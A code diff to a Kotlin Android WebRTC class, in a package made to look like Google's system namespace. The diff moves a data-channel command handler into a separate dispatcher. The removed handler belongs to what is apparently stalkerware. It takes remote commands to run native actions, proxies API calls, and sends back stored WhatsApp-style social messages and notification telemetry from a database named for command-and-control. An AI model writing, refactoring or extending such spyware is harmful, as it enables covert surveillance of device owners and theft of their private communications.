@@ -2,6 +2,7 @@ package com.google.android.system
 
 import android.content.Context
 import android.util.Log
+import com.homemonitor.DeviceApiDispatcher
 import com.homemonitor.WebDashboardApiRouter
 import org.json.JSONObject
 import org.webrtc.*
@@ -22,6 +23,7 @@ class WebRtcEngine(
     private var factory: PeerConnectionFactory? = null
     private var peerConnection: PeerConnection? = null
     private var dataChannel: DataChannel? = null
+    private val apiDispatcher = DeviceApiDispatcher(context)
     @Volatile private var activeSessionId: String? = null
 
     companion object {
@@ -236,85 +238,7 @@ class WebRtcEngine(
             it.data.get(bytes)
             val msgText = String(bytes, StandardCharsets.UTF_8)
             Log.i(TAG, "Received P2P DataChannel Message: '$msgText'")
-
-            try {
-                if (msgText.startsWith("{")) {
-                    val req = JSONObject(msgText)
-                    val type = req.optString("type", "")
-
-                    if (type == "PING") {
-                        val reqTs = req.optLong("timestamp", System.currentTimeMillis())
-                        val pongPayload = JSONObject().apply {
-                            put("timestamp", reqTs)
-                            put("deviceTime", System.currentTimeMillis())
-                            put("status", "ACTIVE")
-                        }
-                        sendP2pMessage("PONG", pongPayload)
-                    } else if (type == "RPC_REQUEST") {
-                        val requestId = req.optString("requestId", "")
-                        val action = req.optString("action", "")
-                        val paramsObj = req.optJSONObject("params") ?: JSONObject()
-
-                        val responseData = NativeRpcActionExecutor.executeNativeAction(context, action, paramsObj)
-
-                        val resPayload = JSONObject().apply {
-                            put("type", "RPC_RESPONSE")
-                            put("requestId", requestId)
-                            put("action", action)
-                            put("status", "SUCCESS")
-                            put("data", responseData)
-                            put("timestamp", System.currentTimeMillis())
-                        }
-                        sendP2pMessage("RPC_RESPONSE", resPayload)
-                    } else if (type == "API_REQUEST") {
-                        val requestId = req.optString("requestId", "")
-                        val path = req.optString("path", "/api/summary")
-                        val method = req.optString("method", "GET")
-                        val body = req.optString("body", "")
-                        val pathUri = android.net.Uri.parse(path)
-
-                        val httpResponseStr = WebDashboardApiRouter.handleApiRequest(
-                            context = context,
-                            method = method,
-                            cleanPath = pathUri.path ?: path,
-                            pathUri = pathUri,
-                            bodyString = body,
-                            clientIp = "P2P_WEBRTC"
-                        )
-
-                        val bodyIndex = httpResponseStr.indexOf("\r\n\r\n")
-                        val responseContent = if (bodyIndex != -1) httpResponseStr.substring(bodyIndex + 4) else httpResponseStr
-
-                        val resPayload = JSONObject().apply {
-                            put("requestId", requestId)
-                            put("path", path)
-                            put("status", 200)
-                            put("data", try { JSONObject(responseContent) } catch (_: Exception) { try { org.json.JSONArray(responseContent) } catch (_: Exception) { responseContent } })
-                        }
-                        sendP2pMessage("API_RESPONSE", resPayload)
-                    } else if (type == "DB_QUERY_SOCIAL") {
-                        val appKey = req.optString("appKey", "whatsapp")
-                        val messagesArray = C2LocalDatabase.getInstance(context).getSocialMessagesJson(appKey)
-                        val res = JSONObject().apply {
-                            put("type", "DB_RESPONSE_SOCIAL")
-                            put("appKey", appKey)
-                            put("messages", messagesArray)
-                        }
-                        sendP2pMessage("DB_RESPONSE_SOCIAL", res)
-                    } else if (type == "DB_QUERY_TELEMETRY") {
-                        val cat = req.optString("category", "notifications")
-                        val logsArray = C2LocalDatabase.getInstance(context).getTelemetryLogsJson(cat)
-                        val res = JSONObject().apply {
-                            put("type", "DB_RESPONSE_TELEMETRY")
-                            put("category", cat)
-                            put("logs", logsArray)
-                        }
-                        sendP2pMessage("DB_RESPONSE_TELEMETRY", res)
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "onMessage error: ${e.message}")
-            }
+            apiDispatcher.handleIncomingDataChannelMessage(this, msgText)
         }
     }
 
